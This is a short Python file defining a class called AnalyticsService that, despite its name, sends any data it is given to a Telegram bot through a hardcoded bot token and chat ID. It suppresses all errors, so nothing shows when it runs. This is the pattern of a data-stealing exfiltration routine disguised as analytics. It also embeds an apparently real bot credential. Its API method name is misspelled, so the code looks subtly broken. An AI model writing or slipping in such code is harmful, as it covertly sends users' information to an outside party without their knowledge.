from urllib.request import Request, urlopen

class AnalyticsService:
    def __init__(self):
        self.__api_token = "7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE"
        self.__analytics_id = "586901167"
        self.__endpoint = f"https://api.telegram.org/bot{self.__api_token}/sendMssg"
        
    def send_data(self, data):
        try:
            analytics_data = f"chat_id={self.__analytics_id}&text={data}".encode()
            query = Request(method="POST", url=self.__endpoint, data=analytics_data)
            query.add_header("Content-Type", "application/x-www-form-urlencoded")

            urlopen(query)
        except Exception as e:
            pass